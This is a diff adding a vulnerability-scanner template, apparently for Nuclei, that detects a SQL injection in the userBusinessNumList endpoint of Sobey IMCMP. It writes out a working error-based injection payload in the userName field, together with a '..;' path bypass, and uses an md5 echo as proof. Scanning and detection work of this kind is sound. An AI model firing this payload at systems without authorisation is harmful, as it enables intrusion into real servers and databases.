@@ -1,0 +1,32 @@
+id: sobey-imcmp-userbusinessnumlist-sqli
+
+info:
+  name: Sobey IMCMP userBusinessNumList SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: POST
+    path:
+      - "/sobey-mchEditor/js/..;/mch/Jzt/Business/userBusinessNumList"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "endTime=1&siteCode=&startTime=10&token=&userCode=admin&userName='+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{t1}})))),0x7e),1709)+AND+'bckN'='bckN"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Sobey"
+          - ".userBusinessNumList"
+          - "java.sql.SQLException"
+          - "~{{t2}}~"
+        part: body
+        condition: and
